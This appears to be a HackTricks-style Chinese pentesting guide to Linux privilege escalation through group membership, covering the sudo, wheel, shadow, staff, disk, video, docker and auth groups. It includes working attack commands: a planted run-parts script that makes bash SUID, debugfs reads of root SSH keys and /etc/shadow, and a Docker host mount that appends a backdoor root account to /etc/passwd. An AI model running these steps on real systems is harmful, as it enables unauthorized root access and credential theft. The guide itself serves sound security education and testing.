# Interesting Groups - Linux Privesc

## Sudo/Admin 组

### **PE - Method 1**

**有时**，系统的 **/etc/sudoers** policy（或其中包含的文件）会包含如下条目：<sup>[[3]](#references)</sup>
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
这意味着，任何匹配任一条目的用户都可以通过 `sudo` 以任意目标用户身份运行任意命令（受策略其余部分的限制）。<sup>[[3]](#references)</sup>

如果是这种情况，要**成为 root，你只需执行**：
```
sudo su
```
### PE - Method 2

查找所有 suid 二进制文件，并检查其中是否存在 **Pkexec** 二进制文件：
```bash
find / -perm -4000 2>/dev/null
```
如果 **pkexec 是 SUID binary**，它只有在 polkit 授权所请求的操作时，才能以其他用户身份执行程序；仅有 SUID 位并不能保证获得 root 权限。请检查已安装的策略以及目标 session 的授权，而不要假设属于 **sudo** 或 **admin** 就足够了。<sup>[[4]](#references)[[5]](#references)</sup>

在仍使用旧版 Local Authority backend 的发行版上，使用以下命令检查其 group 规则：
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
相关组名称和默认设置因发行版而异；只有当本地策略对某个组进行了命名时，该组在这里才有用。<sup>[[5]](#references)</sup>

要**成为 root，可以执行**：
```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```
如果你尝试执行 **pkexec** 并收到此**错误**：
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
在未注册 authentication agent 的 SSH session 中，即使 policy 原本允许执行该操作，`pkexec` 仍可能失败并显示此错误；polkit 将 `pkttyagent` 记录为适用于非桌面 session 的文本 authentication agent。具体行为取决于版本和发行版，因此请验证本地 policy 及 agent 配置。对于受影响的 NixOS 版本，有报告称一种 workaround 是使用 **2 个不同的 SSH session**。<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel 组

有时，sudoers policy 中也可能包含以下条目：
```
%wheel	ALL=(ALL:ALL) ALL
```
这意味着，任何与该条目匹配的用户都可以通过 `sudo` 以任意目标用户身份运行任何命令（受策略其余部分的限制）。<sup>[[3]](#references)</sup>

如果是这种情况，**要成为 root，只需执行**：
```
sudo su
```
## Shadow 组

在系统权限允许的情况下，属于 **shadow** 组的用户可以 **读取** **/etc/shadow**；请在目标系统上验证实际的模式和 ACL：<sup>[[6]](#references)[[7]](#references)</sup>
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
所以，读取该文件并尝试**破解一些 hashes**。

在 triage hashes 时，需要注意一个快速的锁定状态细节：
- 带有 `!` 或 `*` 的条目通常无法用于交互式 password login。
- `!hash` 表示 password 已被锁定；其余字符表示锁定前的 password 字段。
- 包含 `*` 的字段不是有效的 `crypt(3)` hash，并会阻止 UNIX-password login；不要据此推断之前是否设置过 password。
即使 direct login 被阻止，这些信息仍可用于 account classification。<sup>[[6]](#references)</sup>

## Staff Group

**staff**：允许用户在不需要 root privileges 的情况下向系统（`/usr/local`）添加本地修改（注意，`/usr/local/bin` 中的 executables 位于任何用户的 PATH 变量中，并且它们可能会以同名的 executables “覆盖” `/bin` 和 `/usr/bin` 中的 executables）。可与 group "adm" 对比，后者更多与 monitoring/security 相关。<sup>[[2]](#references)[[7]](#references)</sup>

在 `/usr/local/bin` 位于 `PATH` 中的 `/usr/bin` 之前的 Debian configurations 中（如下方示例所示），未限定路径的 command 会优先解析为 `/usr/local/bin` 中的副本；请确认 target 上实际生效的 `PATH`。
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
如果特权进程通过可写的 `/usr/local/bin` 解析未限定命令，替换该命令即可在该进程的权限下执行；在测试前确认实际路径和触发方式。

在 Ubuntu 系统上，登录时 `pam_motd` 会以 root 身份通过 `run-parts --lsbsysinit` 运行可执行脚本；cron 任务也可能使用 `run-parts`，但这取决于具体发行版和配置。<sup>[[10]](#references)[[11]](#references)</sup>
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
在新的 SSH 登录中，`pspy` 可帮助确认目标上是否实际调用了此路径；它无需 root 权限即可观察进程命令行。<sup>[[10]](#references)[[12]](#references)</sup>
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## 磁盘组

加入 **disk** 组可能会获得对块设备的原始访问权限，并且通常**接近 root 访问权限**；Debian 将其描述为基本等同于 root，但请在目标上验证实际的设备权限和存储布局。<sup>[[7]](#references)</sup>

常见的设备路径包括 `/dev/sd*`，但 NVMe 和其他存储布局会使用不同的名称。
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
`debugfs` 适用于 ext2/ext3/ext4 文件系统；上面的 `/root` 和 `/etc/shadow` 等路径是已打开文件系统中的文件，而 `dump` 的第二个参数是原生文件系统上的输出路径。<sup>[[8]](#references)</sup> 例如，以下命令会将已打开文件系统中的 `/tmp/asd1.txt` 提取到原生文件系统上的 `/tmp/asd2.txt`：
```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
`-w` 选项以读写模式打开文件系统，而 `write` 命令会将本地文件复制到已打开的文件系统中。避免在已挂载的活动文件系统上使用它，因为直接编辑可能会损坏文件系统；如有可能，请使用离线镜像进行操作。<sup>[[8]](#references)</sup>
```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```
## 视频组

使用命令 `w` 可以查找**谁已登录系统**，并显示类似以下内容的输出。<sup>[[20]](#references)</sup>
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** 条目标识第一个 Linux 虚拟控制台；它本身并不能证明用户实际在机器旁，尤其是在容器或其他环境中。<sup>[[21]](#references)</sup>

在提供可读 framebuffer 设备的系统上，属于 **video** 组可能会授予对该设备的访问权限。Linux framebuffer 接口将 `/dev/fb0` 记录为可读取的内存设备，可复制该设备以获取屏幕快照；`/sys/class/graphics/fb0/virtual_size` 路径仅在存在相应 fbdev sysfs 属性时可用，因此请先检查目标。<sup>[[7]](#references)[[9]](#references)</sup>
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
如果已安装的 **GIMP** 版本提供 raw-data importer，请使用该 importer 打开 **`screen.raw`**；支持的格式和控件因版本及 plug-in 而异。<sup>[[22]](#references)</sup>

![Disk Group - Video Group: 要打开 raw image，可以使用 GIMP，选择 screen.raw 文件，并将文件类型选择为 Raw image data](<../../../images/image (463).png>)

将图像 Width 和 Height 设置为与 framebuffer geometry 匹配；尝试可用的 pixel formats/Image Types，直到输出清晰可读。<sup>[[9]](#references)</sup>

![Disk Group - Video Group: 然后将 Width 和 Height 修改为屏幕使用的值，并检查不同的 Image Types（选择能够更清晰显示屏幕内容的类型）](<../../../images/image (317).png>)

## Root Group

属于 **root** group 并不会获得 root 的 UID，但由 `root` 所有且对 group 可写的文件，在特权服务或 library 使用这些文件时，仍可能值得关注。在将其视为 privilege-escalation path 之前，请确认文件的实际权限以及其使用方式。

**检查 root 成员可以修改哪些文件**：
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

在标准的 rootful 安装中，加入 `docker` 组即可获得对 Docker daemon 的 root 级访问权限。由于 bind mount 默认具有读写权限，能够控制该 daemon 的用户可以将主机的 `/` 挂载到容器中，并修改主机文件；这实际上等同于获得主机上的 root 权限。<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```
最后，如果你不喜欢之前的任何建议，或者它们由于某些原因无法工作（docker api firewall？），你始终可以尝试**运行一个 privileged container 并从中 escape**，具体说明如下：

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

如果你对 docker socket 具有写权限，请阅读[**这篇关于如何通过滥用 docker socket 来提升权限的文章**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**。**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
./
{{#endref}}

## Adm Group

通常，**`adm`** 组的**成员**具有**读取**位于 _/var/log/_ 内**日志**文件的权限。\
因此，如果你已经 compromise 了属于此组的用户，就应该务必**查看日志**。<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

这些组具有特定于服务和发行版的含义。Debian 将 `backup` 定义为用于委派 backup/restore，`lp` 用于 printer daemons，`mail` 用于 `/var/mail`，因此在将组成员资格视为 privilege path 之前，请检查本地权限。<sup>[[7]](#references)</sup>

它们通常是**credential-discovery** vectors，而不是直接的 root vectors：
- **backup**：可能暴露包含 configs、keys、DB dumps 或 tokens 的 archives。
- **operator**：特定于平台的 operational access，可能 leak 敏感的 runtime data。
- **lp**：print queues/spools 可能包含 document contents。
- **mail**：mail spools 可能暴露 reset links、OTPs 和内部 credentials。

应将此处的组成员资格视为高价值的数据暴露发现，并通过 password/token reuse 进行 pivot。

## Auth group

在 OpenBSD 上，当配置了 S/Key 时，`/etc/skey` 的所有者为 `root:auth`，访问其 records 需要 `auth` 组；YubiKey records 存储在 `/var/db/yubikey` 中。<sup>[[16]](#references)[[17]](#references)</sup> 一个启用了 S/Key 或 YubiKey 的存在漏洞的 OpenBSD 6.6 配置，使具有 `auth` privileges 的本地用户能够成为 root；Qualys 记录了 prerequisite 和 exploit chain，链接的 PoC 实现了该过程。<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [pkexec/pkttyagent authentication without a GUI session (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux manual page](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Securing Debian Manual](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [The Frame Buffer Device — The Linux Kernel documentation](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engine security](https://docs.docker.com/engine/security/)
- [14] [Manage Docker as a non-root user](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Running containers — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD manual pages](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD manual pages](https://man.openbsd.org/login_yubikey.8)
- [18] [Authentication vulnerabilities in OpenBSD — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — local exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux manual page](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux allocated devices (4.x+ version)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Image Import and Export — GIMP Documentation](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
